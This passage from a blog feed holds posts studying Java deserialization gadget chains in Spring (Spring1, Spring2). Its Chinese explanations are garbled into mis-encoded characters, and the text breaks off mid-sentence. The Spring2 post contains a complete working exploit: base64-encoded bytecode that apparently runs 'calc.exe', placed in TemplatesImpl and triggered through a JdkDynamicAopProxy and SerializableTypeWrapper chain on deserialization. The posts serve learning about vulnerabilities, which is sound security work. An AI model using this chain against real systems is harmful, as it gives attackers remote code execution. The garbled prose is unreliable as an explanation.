class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(FileName));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> objectInputStream.readObject();<br>        <span class="hljs-keyword">return</span> o;<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Hessian</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Spring2</title>
    <link href="/2022/04/09/Spring2/"/>
    <url>/2022/04/09/Spring2/</url>
    
    <content type="html"><![CDATA[<h1 id="Spring2"><a href="#Spring2" class="headerlink" title="Spring2"></a>Spring2</h1><p>è·ŸSpring1å·®ä¸å¤šï¼Œä¾èµ–ä¸åŒäº†ã€‚</p><h2 id="ç¯å¢ƒ"><a href="#ç¯å¢ƒ" class="headerlink" title="ç¯å¢ƒ"></a>ç¯å¢ƒ</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;dependency&gt;<br>&lt;groupId&gt;org.springframework&lt;/groupId&gt;<br>&lt;artifactId&gt;spring-core&lt;/artifactId&gt;<br>&lt;version&gt;<span class="hljs-number">4.1</span><span class="hljs-number">.4</span>.RELEASE&lt;/version&gt;<br>&lt;/dependency&gt;<br>&lt;dependency&gt;<br>&lt;groupId&gt;org.springframework&lt;/groupId&gt;<br>&lt;artifactId&gt;spring-aop&lt;/artifactId&gt;<br>&lt;version&gt;<span class="hljs-number">4.1</span><span class="hljs-number">.4</span>.RELEASE&lt;/version&gt;<br>   &lt;/dependency&gt;<br></code></pre></td></tr></table></figure><h2 id="åˆ©ç”¨é“¾"><a href="#åˆ©ç”¨é“¾" class="headerlink" title="åˆ©ç”¨é“¾"></a>åˆ©ç”¨é“¾</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java">SerializableTypeWrapper$MethodInvokeTypeProvider.readObject()<br>    SerializableTypeWrapper.TypeProvider(Proxy).getType()<br>    AnnotationInvocationHandler.invoke()<br>    ReflectionUtils.invokeMethod()<br>    Templates(Proxy).newTransformer()<br>    JdkDynamicAopProxy.invoke()<br>                        AopUtils.invokeJoinpointUsingReflection()<br>    TemplatesImpl.newTransformer()<br></code></pre></td></tr></table></figure><p>ä¸Spring1çš„åŒºåˆ« </p><p><code>JdkDynamicAopProxy.invoke()</code><br>                        <code>AopUtils.invokeJoinpointUsingReflection()</code></p><h2 id="JdkDynamicAopProxy"><a href="#JdkDynamicAopProxy" class="headerlink" title="JdkDynamicAopProxy"></a>JdkDynamicAopProxy</h2><p>çœ‹åå­—å°±çŸ¥é“æ˜¯ä¸ªä»£ç†ï¼Œè€Œä¸”åˆšå¥½ä»£æ›¿äº†spring1çš„</p><p><code>AutowireUtils$ObjectFactoryDelegatingInvocationHandler.invoke()</code><br>                        <code>ObjectFactory(Proxy).getObject()</code>ã€‚ç¡®è®¤ä¸€ä¸‹ã€‚<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202204091123826.png" alt="QQæˆªå›¾20220409110031"></p><p>çœ‹ä¸€ä¸‹è¿™ä¸ªç±»çš„invokeã€‚<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202204091122483.png" alt="QQæˆªå›¾20220409105415"></p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202204091122001.png" alt="QQæˆªå›¾20220409105445"></p><p>è·å– AdvisedSupport é‡Œçš„ TargetSourceï¼Œå¹¶è°ƒç”¨ <code>getTarget()</code> æ–¹æ³•è¿”å›å…¶ä¸­çš„å¯¹è±¡</p><p>æ¥ç€åˆ©ç”¨äº†åå°„ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202204091122740.png" alt="QQæˆªå›¾20220409105727"></p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202204091122549.png" alt="QQæˆªå›¾20220409105727"><br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202204091058943.png" alt="QQæˆªå›¾20220409105803"></p><p>æ‰€ä»¥åˆæ˜¯åªè¦æ§åˆ¶methodä¸ºnewTransformï¼ˆï¼‰å°±å¯ã€‚è¿™é‡Œå·²ç»è·ŸSpring1é“¾æ¥äº†èµ·æ¥ã€‚</p><h2 id="ç»†èŠ‚"><a href="#ç»†èŠ‚" class="headerlink" title="ç»†èŠ‚"></a>ç»†èŠ‚</h2><p>æ­£æ˜¯å› ä¸º     AdvisedSupport é‡Œçš„ TargetSourceï¼Œå¹¶è°ƒç”¨ <code>getTarget()</code> æ–¹æ³•è¿”å›å…¶ä¸­çš„å¯¹è±¡ã€‚è¿™é‡Œå°±ä¸éœ€è¦åƒSpring1ä¸­é‚£æ ·åŠ¨æ€ä»£ç†è¿”å›ä»»æ„æ–¹æ³•ã€‚ï¼ˆç›¸å¯¹æ¥è¯´æ„Ÿè§‰æ˜¯æ˜¯Spring1çš„ç®€åŒ–ç‰ˆäº†ï¼‰<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202204091122419.png" alt="QQæˆªå›¾20220409111650"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">AdvisedSupport</span> <span class="hljs-variable">as</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AdvisedSupport</span>();<br>as.setTarget(templates);<br></code></pre></td></tr></table></figure><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> org.springframework.aop.framework.AdvisedSupport;<br><br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.annotation.Target;<br><span class="hljs-keyword">import</span> java.lang.reflect.*;<br><br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Spring2Test</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>        <span class="hljs-type">byte</span>[] code = Base64.getDecoder().decode(<span class="hljs-string">&quot;yv66vgAAADQALAoABgAeCgAfACAIACEKAB8AIgcAIwcAJAEABjxpbml0PgEAAygpVgEABENvZGUB&quot;</span> +<br>                <span class="hljs-string">&quot;AA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAPTHhzdzZhL0Vp&quot;</span> +<br>                <span class="hljs-string">&quot;dmxUd287AQAKRXhjZXB0aW9ucwcAJQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hl&quot;</span> +<br>                <span class="hljs-string">&quot;L3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJu&quot;</span> +<br>                <span class="hljs-string">&quot;YWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3VtZW50AQAtTGNvbS9z&quot;</span> +<br>                <span class="hljs-string">&quot;dW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNv&quot;</span> +<br>                <span class="hljs-string">&quot;bS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFu&quot;</span> +<br>                <span class="hljs-string">&quot;ZGxlcjsHACYBAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007&quot;</span> +<br>                <span class="hljs-string">&quot;TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29t&quot;</span> +<br>                <span class="hljs-string">&quot;L3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5k&quot;</span> +<br>                <span class="hljs-string">&quot;bGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0v&quot;</span> +<br>                <span class="hljs-string">&quot;RFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRl&quot;</span> +<br>                <span class="hljs-string">&quot;cm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEAClNvdXJjZUZpbGUBAAxFaXZs&quot;</span> +<br>                <span class="hljs-string">&quot;VHdvLmphdmEMAAcACAcAJwwAKAApAQAIY2FsYy5leGUMACoAKwEADXhzdzZhL0VpdmxUd28BAEBj&quot;</span> +<br>                <span class="hljs-string">&quot;b20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRy&quot;</span> +<br>                <span class="hljs-string">&quot;YW5zbGV0AQATamF2YS9pby9JT0V4Y2VwdGlvbgEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9p&quot;</span> +<br>                <span class="hljs-string">&quot;bnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0&quot;</span> +<br>                <span class="hljs-string">&quot;UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJp&quot;</span> +<br>                <span class="hljs-string">&quot;bmc7KUxqYXZhL2xhbmcvUHJvY2VzczsAIQAFAAYAAAAAAAMAAQAHAAgAAgAJAAAAQAACAAEAAAAO&quot;</span> +<br>                <span class="hljs-string">&quot;KrcAAbgAAhIDtgAEV7EAAAACAAoAAAAOAAMAAAAMAAQADQANAA4ACwAAAAwAAQAAAA4ADAANAAAA&quot;</span> +<br>                <span class="hljs-string">&quot;DgAAAAQAAQAPAAEAEAARAAIACQAAAD8AAAADAAAAAbEAAAACAAoAAAAGAAEAAAARAAsAAAAgAAMA&quot;</span> +<br>                <span class="hljs-string">&quot;AAABAAwADQAAAAAAAQASABMAAQAAAAEAFAAVAAIADgAAAAQAAQAWAAEAEAAXAAIACQAAAEkAAAAE&quot;</span> +<br>                <span class="hljs-string">&quot;AAAAAbEAAAACAAoAAAAGAAEAAAAUAAsAAAAqAAQAAAABAAwADQAAAAAAAQASABMAAQAAAAEAGAAZ&quot;</span> +<br>                <span class="hljs-string">&quot;AAIAAAABABoAGwADAA4AAAAEAAEAFgABABwAAAACAB0=&quot;</span> );<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">aClass</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodes</span> <span class="hljs-operator">=</span> aClass.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">tfactory</span> <span class="hljs-operator">=</span> aClass.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> aClass.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        bytecodes.setAccessible(<span class="hljs-literal">true</span>);<br>        tfactory.setAccessible(<span class="hljs-literal">true</span>);<br>        name.setAccessible(<span class="hljs-literal">true</span>);<br>        bytecodes.set(templates,<span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;code&#125;);<br>        tfactory.set(templates, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br>        name.set(templates,<span class="hljs-string">&quot;xsw6a&quot;</span>);<br><br>        <span class="hljs-type">AdvisedSupport</span> <span class="hljs-variable">as</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AdvisedSupport</span>();<br>        as.setTarget(templates);<br><br>        Class&lt;?&gt;       c           = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        Constructor&lt;?&gt; constructor = c.getDeclaredConstructors()[<span class="hljs-number">0</span>];<br>        constructor.setAccessible(<span class="hljs-literal">true</span>);<br><br>        Class&lt;?&gt;       clazz          = Class.forName(<span class="hljs-string">&quot;org.springframework.aop.framework.JdkDynamicAopProxy&quot;</span>);<br>        Constructor&lt;?&gt; aopConstructor = clazz.getDeclaredConstructors()[<span class="hljs-number">0</span>];<br>        aopConstructor.setAccessible(<span class="hljs-literal">true</span>);<br><br>        <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">aopProxy</span> <span class="hljs-operator">=</span> (InvocationHandler) aopConstructor.newInstance(as);<br><br><br>        <span class="hljs-type">Type</span> <span class="hljs-variable">typeTemplateProxy</span> <span class="hljs-operator">=</span> (Type) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Type.class, Templates.class&#125;, aopProxy);<br><br><br>        HashMap&lt;String, Object&gt; map2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        map2.put(<span class="hljs-string">&quot;getType&quot;</span>, typeTemplateProxy);<br><br>        <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">newInvocationHandler</span> <span class="hljs-operator">=</span> (InvocationHandler) constructor.newInstance(Target.class, map2);<br><br>        Class&lt;?&gt; typeProviderClass = Class.forName(<span class="hljs-string">&quot;org.springframework.core.SerializableTypeWrapper$TypeProvider&quot;</span>);<br><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">typeProviderProxy</span> <span class="hljs-operator">=</span> Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;typeProviderClass&#125;, newInvocationHandler);<br><br><br><br>        Class&lt;?&gt;       clazz2 = Class.forName(<span class="hljs-string">&quot;org.springframework.core.SerializableTypeWrapper$MethodInvokeTypeProvider&quot;</span>);<br>        Constructor&lt;?&gt; cons   = clazz2.getDeclaredConstructors()[<span class="hljs-number">0</span>];<br>        cons.setAccessible(<span class="hljs-literal">true</span>);<br><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">objects</span> <span class="hljs-operator">=</span> cons.newInstance(typeProviderProxy, Object.class.getMethod(<span class="hljs-string">&quot;toString&quot;</span>), <span class="hljs-number">0</span>);<br>        <span class="hljs-type">Field</span>  <span class="hljs-variable">field</span>   <span class="hljs-operator">=</span> clazz2.getDeclaredField(<span class="hljs-string">&quot;methodName&quot;</span>);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(objects, <span class="hljs-string">&quot;newTransformer&quot;</span>);<br><br><br>        serialize(objects);<br>        unserialize(<span class="hljs-string">&quot;xsw6a.bin&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object o)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;xsw6a.bin&quot;</span>));<br>        objectOutputStream.writeObject(o);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String FileName)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">objectInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(FileName));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> objectInputStream.readObject();<br>        <span class="hljs-keyword">return</span> o;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>java</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Spring</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Spring1</title>
    <link href="/2022/04/09/Spring1/"/>
    <url>/2022/04/09/Spring1/</url>
    
    <content type="html"><![CDATA[<h1 id="Spring1"><a href="#Spring1" class="headerlink" title="Spring1"></a>Spring1</h1><p>æœ€è¿‘å‡ºäº†ä¸ªå¤§æ ¸å¼¹ï¼Œæƒ³è¦å­¦ä¹ ä¸€ä¸‹å‘ç°ysoéƒ½æ²¡å¼„å®Œï¼Œphpæ–¹é¢çš„çŸ¥è¯†é—æ¼å¤ªå¤šäº†ï¼ŒåŠ¨ä¸åŠ¨å°±ä¸ä¼šã€‚</p><h2 id="ç¯å¢ƒ"><a href="#ç¯å¢ƒ" class="headerlink" title="ç¯å¢ƒ"></a>ç¯å¢ƒ</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">project</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span></span><br><span class="hljs-tag">         <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="hljs-tag">         <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">modelVersion</span>&gt;</span>4.0.0<span class="hljs-tag">&lt;/<span class="hljs-name">modelVersion</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.example<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>Spring1<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.0-SNAPSHOT<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">properties</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">maven.compiler.source</span>&gt;</span>8<span class="hljs-tag">&lt;/<span class="hljs-name">maven.compiler.source</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">maven.compiler.target</span>&gt;</span>8<span class="hljs-tag">&lt;/<span class="hljs-name">maven.compiler.target</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">properties</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-core<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>4.1.4.RELEASE<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-beans<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>4.1.4.RELEASE<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">project</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="åˆ©ç”¨é“¾"><a href="#åˆ©ç”¨é“¾" class="headerlink" title="åˆ©ç”¨é“¾"></a>åˆ©ç”¨é“¾</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java">SerializableTypeWrapper$MethodInvokeTypeProvider.readObject()<br>    SerializableTypeWrapper.TypeProvider(Proxy).getType()<br>    AnnotationInvocationHandler.invoke()<br>    ReflectionUtils.invokeMethod()<br>    Templates(Proxy).newTransformer()<br>    AutowireUtils$ObjectFactoryDelegatingInvocationHandler.invoke()<br>    ObjectFactory(Proxy).getObject()<br>    TemplatesImpl.newTransformer()<br></code></pre></td></tr></table></figure><p>è·Ÿç€ysoçš„ä»£ç åˆ†æä¸€ä¸‹ã€‚</p><h2 id="SerializableTypeWrapper-MethodInvokeTypeProvider"><a href="#SerializableTypeWrapper-MethodInvokeTypeProvider" class="headerlink" title="SerializableTypeWrapper#MethodInvokeTypeProvider"></a>SerializableTypeWrapper#MethodInvokeTypeProvider</h2><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202204081527108.png" alt="QQæˆªå›¾20220408152722"></p><p>æœ‰readObjectï¼Œå¹¶ä¸”è¿™é‡Œæ¥å£TypeProvideræ˜¯ç»§æ‰¿Serializableï¼Œå¯ä»¥ååºåˆ—åŒ–ã€‚è·Ÿè¿›ä»”ç»†è¯»ä¸€ä¸‹findMethodã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202204081558694.png" alt="QQæˆªå›¾20220408155823">å¦‚æœæ­¤Classæ˜¯æ¥å£ï¼Œåˆ™æ­¤æ–¹æ³•è¿”å›trueã€‚å¦åˆ™è¿”å›falseã€‚è·å–äº†å…¶ä¸­çš„getMehodæ–¹æ³•ã€‚æ¥ç€åˆ¤æ–­äº†ä¼ å…¥çš„æ–¹æ³•æ˜¯ä¸æ˜¯ä¼ å…¥ç±»çš„getNameã€‚ç„¶åè¿”å›Methodã€‚<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202204081605334.png" alt="QQæˆªå›¾20220408160524"></p><p>ç´§æ¥ç€åå°„è°ƒç”¨æ­¤æ–¹æ³•ã€‚ä¹Ÿå°±æ˜¯è¯´åœ¨è¿™é‡ŒæŠŠ <code>methodName</code> æ”¹ä¸º <code>newTransformer</code> æ–¹æ³•ï¼Œç„¶åæŠŠ <code>this.provider.getType()</code> æƒ³åŠæ³•å¤„ç†æˆ <code>TemplatesImpl</code> ï¼Œå°±å¯ä»¥è§¦å‘æ¼æ´äº†ã€‚</p><h2 id="ObjectFactoryDelegatingInvocationHandler"><a href="#ObjectFactoryDelegatingInvocationHandler" class="headerlink" title="ObjectFactoryDelegatingInvocationHandler"></a>ObjectFactoryDelegatingInvocationHandler</h2><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202204081620256.png" alt="QQæˆªå›¾20220408162041"></p><p> å¾ˆæ˜æ˜¾è¯¥ç±»æ˜¯InvocationHandler çš„å®ç°ç±»ï¼Œå®ä¾‹åŒ–æ—¶æ¥æ”¶ä¸€ä¸ª ObjectFactory å¯¹è±¡ï¼Œå¹¶åœ¨ invoke ä»£ç†æ—¶è°ƒç”¨ ObjectFactory çš„ getObject æ–¹æ³•è¿”å› ObjectFactory çš„å®ä¾‹ç”¨äº Method çš„åå°„è°ƒç”¨ã€‚é‚£ä¹ˆè¿™é‡Œå°±èƒ½å¤Ÿåˆ©ç”¨åŠ¨æ€ä»£ç†å®ç°ä»»æ„å¯¹è±¡ã€‚</p><h3 id="è¡¥å……"><a href="#è¡¥å……" class="headerlink" title="è¡¥å……"></a>è¡¥å……</h3><p>åˆ©ç”¨ <code>AnnotationInvocationHandler</code> æ§åˆ¶ä»£ç†æ–¹æ³•è°ƒç”¨çš„è¿”å›å€¼ã€‚ åœ¨ <code>invoke()</code> æ–¹æ³•ä¸­çš„ï¼Œå½“ proxy class è°ƒç”¨çš„æ–¹æ³•åä¸æ˜¯ <code>equals</code>ã€<code>toString</code>ã€<code>hashCode</code>ã€<code>annotationType</code> æ—¶ï¼Œä¼šä» <code>memberValues</code> (ç±»å‹ä¸º Map) å– key ä¸º <code>method</code> 